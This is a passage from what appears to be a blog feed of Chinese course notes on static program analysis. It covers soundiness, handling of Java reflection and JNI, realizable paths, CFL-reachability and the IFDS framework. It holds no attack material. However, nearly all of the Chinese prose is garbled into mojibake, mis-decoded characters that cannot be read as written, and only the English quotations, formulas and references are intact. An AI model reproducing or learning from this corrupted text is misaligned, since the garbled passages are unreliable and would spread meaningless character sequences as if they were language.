featureçš„å¤„ç†æ–¹å¼ï¼Œæå«Soundinessã€‚</p><p>Soundinessè¯æ ¹æ¥æºäºsoundy:</p><blockquote><p>A soundy analysis typically means that the analysis ismostly sound, with well-identified unsound treatments to hard/specific language features.</p></blockquote><p>çµæ„Ÿæ¥æºäºTruthinessï¼Œæ„æ€è®©äººä¿¡ä»¥ä¸ºçœŸï¼Œå´æ²¡æœ‰äº‹å®è¯æ˜çš„ç†è®ºã€‚</p><h2 id="Soundness-Soundiness-and-Unsoundness"><a href="#Soundness-Soundiness-and-Unsoundness" class="headerlink" title="Soundness, Soundiness and Unsoundness"></a>Soundness, Soundiness and Unsoundness</h2><ul><li>Soundnessï¼š ä¸€ä¸ª sound çš„åˆ†æå¯ä»¥è€ƒè™‘åˆ°æ‰€æœ‰çš„ç¨‹åºè¿è¡Œæ—¶è¡Œä¸ºï¼›</li><li>Soundinessï¼šä¸€ä¸ª soundiness çš„åˆ†æå¯¹äºç¨‹åº hard features æœ‰ä¸€å®šåˆç†çš„å¤„ç†ï¼Œç»å¤§æƒ…å†µä¸‹æ˜¯soundçš„ï¼›</li><li>Unsoundnessï¼šæ–¹æ³•è®¾è®¡ä¸­ä¸ºè¿½æ±‚é€Ÿåº¦ã€é€šç”¨æ€§ç­‰å¿½ç•¥soundçš„åˆ†æã€‚</li></ul><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>åå°„æ˜¯Javaçš„åŠ¨æ€ç‰¹æ€§ï¼Œåªæœ‰è¿è¡Œæ—¶æ‰å¯çŸ¥å…·ä½“ç±»ã€‚</p><h2 id="String-Constant-Analysis-Pointer-Analysis"><a href="#String-Constant-Analysis-Pointer-Analysis" class="headerlink" title="String Constant Analysis + Pointer Analysis"></a>String Constant Analysis + Pointer Analysis</h2><p>Livshits[2] ç­‰äººä½¿ç”¨å­—ç¬¦ä¸²å¸¸é‡åˆ†æå’ŒæŒ‡é’ˆåˆ†æè·å–åå°„çš„å…·ä½“å€¼ï¼Œä½†æ˜¯å¯¹äºé…ç½®æ–‡ä»¶ã€ç½‘ç»œã€ç”¨æˆ·è¾“å‡ºç­‰å¤æ‚æƒ…å†µä»ç„¶å…·æœ‰å±€é™æ€§ã€‚</p><h2 id="Type-Inference-String-analysis-Pointer-Analysis"><a href="#Type-Inference-String-analysis-Pointer-Analysis" class="headerlink" title="Type Inference + String analysis + Pointer Analysis"></a>Type Inference + String analysis + Pointer Analysis</h2><p>Li[3]ç­‰äººï¼ˆå°±æ˜¯è€å¸ˆOrzï¼‰é€šè¿‡è°ƒç”¨å‚æ•°çš„ç±»å‹ã€å­—ç¬¦ä¸²åˆ†æå’ŒæŒ‡é’ˆåˆ†æè·å–åå°„çš„å…·ä½“å€¼ï¼Œå³è™½ç„¶åœ¨åå°„ç‚¹æ— æ³•è§£æç±»ï¼Œä½†æ˜¯é€šè¿‡ä½¿ç”¨æ—¶çš„ç‰¹å¾å¯ä»¥æ¨å¯¼åŸå‡½æ•°ï¼Œåœ¨å®éªŒä¸­ï¼Œå·¥å…·æ¨å¯¼å‡º50ä¸ªç›®æ ‡çš„ç›®æ ‡å‡½æ•°ï¼Œå…¶ä¸­48ä¸ªæ˜¯çœŸå®çš„ã€‚</p><p>ä»–ä»¬çš„åç»§å·¥ä½œ[4] æ˜¯ç›®å‰æœ€å…ˆè¿›çš„åå°„å¤„ç†æ–¹å¼ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆSoundinessï¼‰/image-20200915202808772.png" alt="image-20200915202808772"></p><h2 id="Assisted-by-Dynamic-Analysis"><a href="#Assisted-by-Dynamic-Analysis" class="headerlink" title="Assisted by Dynamic Analysis"></a>Assisted by Dynamic Analysis</h2><p>Bodden[5] ç­‰äººæå‡ºå€ŸåŠ©äºæµ‹è¯•ç”¨ä¾‹åŠ¨æ€è¿è¡Œç¨‹åºï¼Œèƒ½è§£å‡ºçœŸå®çš„åå°„ç»“æœï¼Œè¿™ä¸€ç±»å·¥ä½œå®é™…ä¸Šæˆä¸ºæœ€ä¸ºå¸¸ç”¨çš„å·¥ä½œã€‚</p><h1 id="Native-Language"><a href="#Native-Language" class="headerlink" title="Native Language"></a>Native Language</h1><h2 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h2><p>Javaé€šè¿‡JNIæ¥å£è°ƒç”¨C/C++ç¨‹åºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆSoundinessï¼‰/image-20200915203915073.png" alt="image-20200915203915073"></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>ä¸»è¦æ–¹æ³•æ˜¯æ‰‹åŠ¨å»ºæ¨¡ï¼Œå°†JNIå‡½æ•°è½¬åŒ–ä¸ºjavaä»£ç ï¼Œå†è½¬åŒ–ä¸ºåˆ†æè§„åˆ™<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆSoundinessï¼‰/image-20200915204053331.png" alt="image-20200915204053331"></p><p>Fourtounis[6]ç­‰äººå°†ä¸€äº›javaçš„nativeå‡½æ•°è¿˜åŸæˆæ¨¡å‹ã€‚</p><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><p>å…¶ä»–ä¸Soundinessçš„å·¥ä½œï¼š<a href="http://soundiness.org/" target="_blank" rel="noopener">http://soundiness.org/</a></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>Livshits B, Sridharan M, Smaragdakis Y, et al. In defense of soundiness: a manifesto[J]. Communications of the ACM, 2015, 58(2): 44-46.</li><li>Livshits B, Whaley J, Lam M S. Reflection analysis for Java[C]//Asian Symposium on Programming Languages and Systems. Springer, Berlin, Heidelberg, 2005: 139-160.</li><li>Li Y, Tan T, Sui Y, et al. Self-inferencing reflection resolution for Java[C]//European Conference on Object-Oriented Programming. Springer, Berlin, Heidelberg, 2014: 27-53.</li><li>Li Y, Tan T, Xue J. Understanding and analyzing java reflection[J]. ACM Transactions on Software Engineering and Methodology (TOSEM), 2019, 28(2): 1-50.</li><li>Bodden E, Sewe A, Sinschek J, et al. Taming reflection: Aiding static analysis in the presence of reflection and custom class loaders[C]//2011 33rd International Conference on Software Engineering (ICSE). IEEE, 2011: 241-250.</li><li>Fourtounis G, Triantafyllou L, Smaragdakis Y. Identifying Java calls in native code via binary scanning[C]//Proceedings of the 29th ACM SIGSOFT International Symposium on Software Testing and Analysis. 2020: 388-400.</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Soundiness&quot;&gt;&lt;a href=&quot;#Soundiness&quot; class=&quot;headerlink&quot; title=&quot;Soundiness&quot;&gt;&lt;/a&gt;Soundiness&lt;/h1&gt;&lt;p&gt;Soundinessæ˜¯äº”å¹´å‰çš„æ¦‚å¿µï¼Œå­¦è€…ä»¬å‘ç°ç¨‹åºåˆ†æç”¨äºå®é™…çš„ç°ä»£è¯­è¨€ä¸­ä»å­˜åœ¨å„ç§é—®é¢˜ï¼Œè¿™äº›é—®é¢˜æ˜¯éš¾ä»¥åˆ†æçš„è¯­è¨€ç‰¹æ€§å¯¼è‡´çš„ï¼Œå› æ­¤æå‡ºSoundinessï¼Œè¯´æ˜å¦‚ä½•å¤„ç†è¿™äº›éš¾è§£çš„é—®é¢˜ã€‚&lt;/p&gt;&lt;h2 id=&quot;Hard-features&quot;&gt;&lt;a href=&quot;#Hard-features&quot; class=&quot;headerlink&quot; title=&quot;Hard features&quot;&gt;&lt;/a&gt;Hard features&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Hard-to-analyze features: an aggressively conservative treatment to these features will likely make the analysis too imprecise to scale,rendering the analysis useless.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88IFDS%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/</id>
    <published>2020-09-12T13:22:13.000Z</published>
    <updated>2020-10-04T03:27:31.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Feasible-and-Realizable-Paths"><a href="#Feasible-and-Realizable-Paths" class="headerlink" title="Feasible and Realizable Paths"></a>Feasible and Realizable Paths</h1><h2 id="In-Feasible-Paths"><a href="#In-Feasible-Paths" class="headerlink" title="(In)Feasible Paths"></a>(In)Feasible Paths</h2><blockquote><p><strong>Infeasible Paths:</strong> Paths in CFG that do not correspond to actual executions.</p></blockquote><p>ç¨‹åºåœ¨CFGä¸­ä¼šå­˜åœ¨ä¸è¢«æ‰§è¡Œåˆ°è·¯å¾„ï¼Œè¿™äº›è·¯å¾„ä¼šæ±¡æŸ“åˆ†æç»“æœï¼Œç»™é™æ€åˆ†æå¸¦æ¥ä¸åˆ©å½±å“ã€‚</p><a id="more"></a><p>ç„¶è€Œï¼Œé™æ€ç¨‹åºåˆ†ææ— æ³•åˆ¤æ–­ä¸€ä¸ªè¾¹æ˜¯å¦èƒ½è¢«æ‰§è¡Œåˆ°ï¼Œä¾‹å¦‚ä¸‹é¢ä»£ç ï¼Œè¯­ä¹‰ä¸Šè®¤ä¸ºç¨‹åºä¸ä¼šèµ° <code>r=-1</code> çš„è·¯å¾„ï¼Œä½†æ˜¯ageæ˜¯å‡½æ•°çš„è¾“å…¥ï¼Œé™æ€åˆ†ææ— æ³•åˆ¤æ–­ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200912200105336.png" alt="image-20200912200105336"></p><p>ç„¶è€Œï¼Œé™æ€åˆ†æå¯ä»¥è¯†åˆ«éƒ¨åˆ†ä¸å¯è¡Œçš„è·¯å¾„ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200912201058304.png" alt="image-20200912201058304"></p><p>å°½ç®¡ <code>r=-1</code> æ— æ³•é¿å…ï¼Œä½†æ˜¯åœ¨<code>call foo(30) -&gt; exit foo -&gt; x=return foo</code>è¿™ä¸ªä¸å¯è¡Œè¾¹æ˜¯å¯ä»¥åˆ†æå‡ºçš„ã€‚</p><h2 id="Realizable-Paths"><a href="#Realizable-Paths" class="headerlink" title="Realizable Paths"></a>Realizable Paths</h2><blockquote><p><strong>Realizable Paths:</strong> The paths in which â€œreturnsâ€ are matched with corresponding â€œcallsâ€.</p></blockquote><p>æ‰€è°“ Realizable Paths å³æŒ‡é‚£äº›ä¸è°ƒç”¨ç‚¹ç›¸å¯¹åº”çš„è¿”å›è·¯å¾„ï¼Œæ³¨æ„ Realizable Paths ä¸ä¸€å®šå¯æ‰§è¡Œï¼Œä½†æ˜¯ unrealizable paths ä¸€å®šä¸å¯æ‰§è¡Œã€‚</p><p>åˆ¤æ–­è¿™äº›è¾¹æ˜¯å¦ realizable çš„ä¸€ä¸ªæ€è·¯æ˜¯åœ¨è°ƒç”¨å’Œè¿”å›è¾¹ä¸ŠåŠ  â€œ(â€œ å’Œ â€œ)â€ï¼Œæ¥ç€å°±å¯ä»¥ç”¨æ‹¬å·åŒ¹é…çš„æ–¹å¼åˆ¤æ–­è·¯å¾„æ˜¯å¦realizableï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200912202526474.png" alt="image-20200912202526474"></p><p>å¦‚ä¸Šæ‰€ç¤ºï¼Œ<code>(1</code>åªèƒ½åŒ¹é…<code>)1</code>ï¼Œ<code>(2</code>åªèƒ½åŒ¹é…<code>)2</code>ã€‚</p><h1 id="CFL-Reachability"><a href="#CFL-Reachability" class="headerlink" title="CFL-Reachability"></a>CFL-Reachability</h1><p>å…·ä½“æ¥è¯´ï¼Œç”¨ CFL-Reachability è§£å†³è·¯å¾„realizableé—®é¢˜ï¼š</p><blockquote><p><strong>CFL-Reachability:</strong> A path is considered to connect two nodes A and B, or <strong>B is reachable from A</strong>, only if the concatenation of the labels on the edges of the path is a word in a specified <strong>context-free language</strong>.</p></blockquote><p>ç®€å•è¯´ï¼Œåœ¨è¾¹ä¸Šæ·»åŠ labelï¼Œé‚£ä¹ˆä¸€ä¸ªè·¯å¾„realizableå³è¿™ä¸ªè·¯å¾„ä¸Šçš„è¾¹labelç»„æˆäº†ä¸€ä¸ªwordï¼Œè¿™ä¸ªwordæ˜¯ç¬¦åˆå®šä¹‰çš„ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼ˆCFLï¼‰çš„ã€‚</p><p>ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ç”±ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•ï¼ˆCFG, context-free grammarï¼‰å®šä¹‰â€”â€”ç¼–è¯‘åŸç†ä¸­çš„æ¦‚å¿µï¼Œè¯¦æƒ…è§é™„å½•ã€‚</p><p>è·¯å¾„ realizable é—®é¢˜è¢«CFLè½¬åŒ–ä¸ºéƒ¨åˆ†æ‹¬å·åŒ¹é…é—®é¢˜ï¼ˆPartially Balanced-Parenthesis Problemï¼‰ï¼š</p><ul><li>å¯¹äºæ¯ä¸€ä¸ªå³æ‹¬å·â€œ)iâ€ éƒ½éœ€è¦æœ‰ä¸€ä¸ªå¯¹åº”çš„å·¦æ‹¬å·â€œ(iâ€ï¼Œä½†åä¹‹åˆ™ä¸éœ€è¦â€”â€”å‡½æ•°è°ƒç”¨çš„è¾¹æ˜¯ä¸€å®šå¯è¾¾çš„ï¼›</li><li>å¯¹äºæ¯ä¸ªè°ƒç”¨ç‚¹iï¼Œå°†å…¶è°ƒç”¨è¾¹åŠ  â€œ(iâ€ çš„æ ‡ç­¾ï¼Œå°†å…¶è¿”å›è¾¹åŠ  â€œ)iâ€çš„æ ‡ç­¾ï¼›</li><li>å¯¹äºå…¶ä»–è¾¹æ·»åŠ â€œeâ€æ ‡ç­¾ã€‚</li></ul><p>å¦‚æ­¤å¯ä»¥å®šä¹‰å¦‚ä¸‹ä¸Šä¸‹æ–‡æ–‡æ³•ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200912210815067.png" alt="image-20200912210706949" style="width:60%;"></p><p>ç¬¦åˆè¿™å¥—æ–‡æ³•çš„è·¯å¾„å°±æ˜¯å¯è¾¾çš„ã€‚</p><h1 id="Overview-of-IFDS"><a href="#Overview-of-IFDS" class="headerlink" title="Overview of IFDS"></a>Overview of IFDS</h1><p>IFDS[1] å®é™…æ˜¯ Interprocedural, Finite, Distributive, Subset Problemï¼Œå³ IFDS æ˜¯ç”¨æ¥è§£å†³è¿‡ç¨‹é—´æ•°æ®æµåˆ†æï¼ˆ<strong>interprocedural</strong> data flowï¼‰çš„é—®é¢˜ï¼Œè€Œè¿™äº›é—®é¢˜è¿˜éœ€æ»¡è¶³ä¸€ä¸‹æ¡ä»¶1. åˆ†æçš„domainæ˜¯æœ‰é™çš„ï¼ˆ<strong>finite</strong>ï¼‰ï¼›2. flow functionæ»¡è¶³åˆ†é…ç‡ï¼ˆ<strong>distributive</strong>ï¼‰ï¼›3. æ˜¯ä¸€ä¸ªå­é›†ç±»å‹çš„é—®é¢˜ï¼ˆ<strong>subset problem</strong>ï¼‰ã€‚</p><p>ä¸‹é¢å›é¡¾ä¸€ä¸‹å…ˆå‰æ•°æ®æµåˆ†æçš„ä¸€äº›ä¾‹å­æ˜¯å¦æ»¡è¶³ï¼š</p><ul><li>distributiveï¼š$F$ åœ¨$\sqcup$ä¸Šæ»¡è¶³åˆ†é…ç‡ï¼Œgen-killçš„é—®é¢˜éƒ½æ»¡è¶³ï¼›</li><li>finiteï¼šå‰ä¸‰ä¸ªé—®é¢˜æ˜¯ï¼Œä½†æœ‰äº›é—®é¢˜çš„domainæ˜¯infiniteçš„ï¼Œå¦‚constant propagationï¼›</li><li>subset problemï¼šå¯¹é›†åˆæ“ä½œçš„é—®é¢˜ï¼Œå‰ä¸‰ä¸ªé—®é¢˜éƒ½æ˜¯ã€‚</li></ul><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹äºä¸€ä¸ªç»™å®šç¨‹åº Pï¼Œä»¥åŠä¸€ä¸ªæ•°æ®æµåˆ†æé—®é¢˜ Qï¼š</p><ul><li>é¦–å…ˆæ„å»º supergraph $G^*$ï¼Œæ¥ç€å®šä¹‰$Q$ çš„flow functionsï¼ˆç±»ä¼¼äºå…ˆå‰çš„è½¬æ¢å‡½æ•°ï¼‰ï¼›</li><li>å°†flow functionsè½¬åŒ–ä¸ºrepresentation relationsï¼Œåº”ç”¨äº$G^*$ï¼Œå¾—åˆ°exploded supergraph $G^#$ï¼›</li><li>å°†é—®é¢˜ Q è½¬åŒ–ä¸ºå›¾ $G^#$ ä¸Šçš„å¯è¾¾æ€§é—®é¢˜ï¼Œåº”ç”¨ Tabulation algorithm è®¡ç®—å¯è¾¾æ€§ï¼Œå¦‚ï¼šé—®é¢˜Qä¸ºReaching Definitionsï¼ˆåœ¨ç¨‹åºç‚¹nå¤„ï¼Œå˜é‡ $d$ æ˜¯å¦æœ‰æ–°å®šä¹‰ï¼Œdata fact $d \in MRP_n$ï¼‰ï¼Œé‚£ä¹ˆé—®é¢˜è½¬åŒ–ä¸ºåœ¨å›¾ $G^#$ ä¸Šæ˜¯å¦æœ‰ä»$<s_{main},0>\rightarrow<n,d>$çš„å¯è¾¾è·¯å¾„ã€‚</n,d></s_{main},0></li></ul><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913152829431.png" alt="image-20200913152829431"></p><h2 id="MRP"><a href="#MRP" class="headerlink" title="MRP"></a>MRP</h2><p>IFDSèƒ½å¤Ÿæä¾›MRPçš„åˆ†æã€‚</p><p>å›å¿†å…ˆå‰åˆ†æï¼Œå¯¹äºä¸€ä¸ªè·¯å¾„ $p$ï¼Œå®šä¹‰è½¬æ¢å‡½æ•°ä¸º $pf_p$ï¼Œé‚£ä¹ˆ $pf_{p}=f_{n} \circ \ldots \circ f_{2} \circ f_{1}$</p><p>é‚£ä¹ˆä»startè‡³nçš„è·¯å¾„$Paths(start, n)$ï¼ŒMOP çš„åˆ†æç»“æœä¸ºï¼š</p><script type="math/tex; mode=display">\mathrm{MOP}_{n}=\sqcup_{p \in \mathrm{Paths}(\text {start}, n)} p f_{p}(\perp)</script><p>è€Œ MRP çš„åˆ†æç»“æœä¸ºï¼š</p><script type="math/tex; mode=display">\operatorname{MRP}_{n}=\sqcup_{p \in \operatorname{RPaths}(s t a r t, n)} p f_{p}(\perp)</script><p>åŒºåˆ«å°±åœ¨äº MRP åªåˆ†æReachable Pathï¼Œå› æ­¤ MRP æ¯”MOPæ›´å‡†ç¡®ï¼š</p><script type="math/tex; mode=display">MRP_n \sqsubseteq MOP_n</script><h1 id="Supergraph-and-Flow-Functions"><a href="#Supergraph-and-Flow-Functions" class="headerlink" title="Supergraph and Flow Functions"></a>Supergraph and Flow Functions</h1><h2 id="Supergraph"><a href="#Supergraph" class="headerlink" title="Supergraph"></a>Supergraph</h2><p>åœ¨IFDSä¸­ï¼Œç¨‹åºè¢«è¡¨ç¤ºä¸ºSupergraphï¼Œè®°ä¸º$G^<em>=(N^</em>,E^*)$ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><ul><li>$G^*$ æ˜¯æ‰€æœ‰å‡½æ•°å†…æ§åˆ¶æµå›¾ï¼ˆ$G_1$, $G_2$,â€¦ï¼‰çš„é›†åˆï¼›</li><li>æ¯ä¸€ä¸ªæ§åˆ¶æµå›¾ $G_p$ æœ‰ä¸€ä¸ªå”¯ä¸€å¼€å§‹èŠ‚ç‚¹ $s_p$ å’Œç»“æŸèŠ‚ç‚¹ $e_p$ï¼›</li><li>æ¯ä¸€ä¸ªè¿‡ç¨‹é—´è°ƒç”¨éƒ½å­˜åœ¨ä¸€ä¸ª$Call_p$èŠ‚ç‚¹ï¼ˆcall nodeï¼‰å’Œ$Ret_p$èŠ‚ç‚¹ï¼ˆreturn-site nodeï¼‰ã€‚</li></ul><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913155502967.png" alt="image-20200913155502967" style="width:80%;"></p><p>æ¯ä¸ªè°ƒç”¨å­˜åœ¨ä¸‰ç±»è¾¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><ul><li>call-to-return-site edgeï¼šè¿æ¥$Call_p$è‡³$Ret_p$çš„è¾¹ï¼ˆç´«è‰²ï¼‰ï¼›</li><li>call-to-start edgeï¼šè¿æ¥$Call_p$è‡³$s_p$çš„è¾¹ï¼ˆç»¿è‰²ï¼‰ï¼Œè¡¨ç¤ºä»call-siteè‡³è°ƒç”¨å‡½æ•°å…¥å£ï¼›</li><li>exit-to-return-site edgeï¼šè¿æ¥$e_p$è‡³$Ret_p$ï¼ˆè“è‰²ï¼‰ï¼Œè¡¨ç¤ºè°ƒç”¨å®Œæˆè¿”å›åŸä¸Šä¸‹æ–‡ã€‚</li></ul><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913155944787.png" alt="image-20200913155944787" style="width:80%;"></p><h2 id="Flow-Function"><a href="#Flow-Function" class="headerlink" title="Flow Function"></a>Flow Function</h2><p>Flow functionå®šä¹‰ä¸ºåŒ¿åå‡½æ•°ï¼Œå½¢å¼ä¸º$\lambda e_{p a r a m} \cdot e_{b o d y}$ï¼Œå³â€œè¾“å…¥.å‡½æ•°ä½“â€ã€‚</p><p>å‡è®¾å¯¹â€œæœªåˆå§‹åŒ–å˜é‡â€é—®é¢˜è®¾è®¡Flow Functionï¼š</p><blockquote><p>Possibly-uninitialized variables: for each node $nâˆˆN^*$, determine the set of variables that may be uninitialized before execution reaches n.</p></blockquote><p>æ³¨æ„æ¼”ç¤ºæ—¶å¯¹æ¯ä¸ªè¾¹è®¾è®¡å‡½æ•°ï¼ŒçœŸå®æƒ…å†µä¸‹åªéœ€è¦å¯¹å››ç§ç±»å‹çš„è¾¹åšå®šä¹‰ï¼Œè€Œä¸æ˜¯æ‰€æœ‰è¾¹æ‰‹å·¥å®šä¹‰ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913161605544.png" alt="image-20200913161605544"></p><ol><li><p>ç¨‹åºåˆå§‹åŒ–ï¼Œå¯è§ <code>x, g</code> éƒ½æ²¡æœ‰èµ‹å€¼ï¼Œå› æ­¤å°†å…¶åŠ å…¥æœªå®šä¹‰é›†åˆ$S$ä¸­ï¼›</p></li><li><p>å¯¹äº<code>x=0</code>ï¼Œ<code>x</code>è¢«èµ‹å€¼ï¼Œå°†<code>x</code>ä»é›†åˆä¸­å‰”é™¤ï¼›</p></li><li><p>å¯¹äº$Call_p \rightarrow S_p$ï¼Œå°†å®å‚<code>x</code>çŠ¶æ€èµ‹å€¼åˆ°å½¢å‚<code>a</code>ä¸Šï¼Œå³<code>&lt;x/a&gt;</code>ï¼›</p></li><li>å¯¹äº<code>a=a-g</code>ï¼Œå¦‚æœaæˆ–gæœªå®šä¹‰ï¼Œé‚£ä¹ˆèµ‹å€¼ä¼šå‡ºé”™ï¼Œå°†aåŠ å…¥æœªå®šä¹‰é›†åˆï¼Œå¦åˆ™èµ‹å€¼æˆåŠŸï¼Œå°†aä»æœªèµ‹å€¼é›†åˆä¸­å»é™¤ï¼›</li><li>å¯¹äº$e_p \rightarrow Ret_p$ï¼Œåœ¨é›†åˆä¸­åˆ å»å½¢å‚ <code>a</code> çš„åˆ†æç»“æœï¼›</li><li>å¯¹äº$Call_p \rightarrow Ret_p$ï¼Œä¸å…ˆå‰è¿‡ç¨‹é—´åˆ†æç»“æœç±»ä¼¼ï¼Œè€ƒè™‘åˆ°<code>g</code>æ˜¯å…¨å±€å˜é‡ï¼Œé‚£ä¹ˆåœ¨$Call_p \rightarrow S_p$æ—¶ï¼Œ<code>g</code>çš„çŠ¶æ€ä¹Ÿä¼šåœ¨é›†åˆä¸­ä¼ è¿‡å»ï¼Œè°ƒç”¨å®Œgæ˜¯å¦å®šä¹‰æ˜¯ç”± <code>P()</code>å®ç°å†³å®šçš„ï¼ˆæ˜¯å¦å®šä¹‰çš„ç»“æœä»$e_p \rightarrow Ret_p$è¿™æ¡è¾¹ä¼ è¿‡æ¥ï¼‰ï¼Œ$Ret_p$ä¼šåš $\cup$ æ“ä½œï¼Œå› æ­¤è¿™é‡Œéœ€è¦åˆ é™¤ <code>g</code>ï¼Œä¿è¯æ›´å‡†ç¡®çš„ç»“æœã€‚</li></ol><h1 id="Exploded-Supergraph-and-Tabulation-Algorithm"><a href="#Exploded-Supergraph-and-Tabulation-Algorithm" class="headerlink" title="Exploded Supergraph and Tabulation Algorithm"></a>Exploded Supergraph and Tabulation Algorithm</h1><h2 id="Build-Exploded-Supergraph"><a href="#Build-Exploded-Supergraph" class="headerlink" title="Build Exploded Supergraph"></a>Build Exploded Supergraph</h2><p>é¦–å…ˆéœ€è¦å°† Flow Functionè½¬æ¢ä¸º representation relationï¼Œ representation relations å¯ç”¨ä¸€ä¸ªäºŒåˆ†å›¾è¡¨ç¤ºï¼Œå›¾ä¸­æœ‰ 2(D+1) ä¸ªèŠ‚ç‚¹ï¼ˆè‡³å¤š $(D+1)^2$ æ¡è¾¹ï¼‰ï¼Œ$D$ å…ˆå‰ä¹Ÿä»‹ç»è¿‡ï¼Œä½œä¸ºdataflow factsçš„é›†åˆï¼ˆé›†åˆå¿…é¡»æ˜¯æœ‰é™çš„ï¼‰ï¼Œè¿™é‡Œå°±æ˜¯å˜é‡çš„æ•°é‡ã€‚</p><p>ä¸€ä¸ªFlow function $f$ çš„ representation relationå®šä¹‰ä¸º$R_f$ï¼Œ $R_f\subseteq (D\cup 0) \times (D\cup 0)$ï¼Œå®é™…ä¸Šå°±æ˜¯æ˜ å°„äº†$f \rightarrow edges$ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913164759047.png" alt="image-20200913164759047"></p><ol><li><p>$R_f=\{(0,0)\}$ï¼Œæ— æ¡ä»¶åŠ ä¸€æ¡$0\rightarrow 0$è¾¹ï¼Œä¸‹æ–‡ä¼šè§£é‡Šè¯¥è¾¹çš„ä½œç”¨ï¼›</p></li><li><p>$R_f=\{(0,y)\mid y\in f(\emptyset)\}$ï¼Œå¯¹äº<code>f(_){return (y,_)}</code>çš„functionï¼Œå¢åŠ $0\rightarrow y$ï¼›</p></li><li><p>$R_f=\{(x, y) \mid y \notin f(\emptyset) \text { and } y \in f(\{x\})\}$ï¼Œå¯¹äº<code>f(x,_){return (y,_)}</code>çš„functionï¼Œå¢åŠ $x\rightarrow y$ã€‚</p></li></ol><p>ä»¥å›¾ä¸Šå››ä¸ªfunctionä¸ºä¾‹ï¼š</p><ul><li><p>å¯¹äº$\lambda\text{ } \mathrm{S} \cdot(\mathrm{S}-\{\mathrm{a}\}) \cup\{\mathrm{b}\}$ï¼Œé¦–å…ˆæ— æ¡ä»¶æ·»åŠ $0\rightarrow 0$è¾¹ï¼›æ¥ç€ç”±äºå…¶æ€»ä¼šè¿”å›<code>b</code>ï¼Œå› æ­¤ç¬¦åˆ2ï¼Œå¢åŠ $0\rightarrow b$ï¼›æœ€åè‹¥è¾“å…¥é™¤<code>a</code>ï¼Œ<code>b</code>ä»¥å¤–çš„å€¼ï¼Œç¬¦åˆ3ï¼Œæ·»åŠ $c\rightarrow c$ï¼›</p></li><li><p>å¯¹äº$\lambda\text{ } ifthenelse$ï¼Œå› ä¸ºæœ‰<code>f(a,_){return(a,b,_)}</code>ï¼Œå› æ­¤å¢åŠ $a\rightarrow a,a\rightarrow b$ï¼Œå…¶ä»–åŒä¸Šã€‚</p></li></ul><p>ä»æ­¤ä¹‹åï¼Œåˆ†æä¸å†éœ€è¦flow functionï¼Œåªéœ€è¦å°†Relationsåœ¨Supergraphä¸Šç”»å‡ºå³å¯ã€‚</p><p>æ ¹æ®Representation  Relationså¯ä»¥å¾—åˆ°$G^#$ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913175721703.png" alt="image-20200913175721703"></p><p><strong>ä¸ºä½•è¦æ·»åŠ  $0\rightarrow 0$ 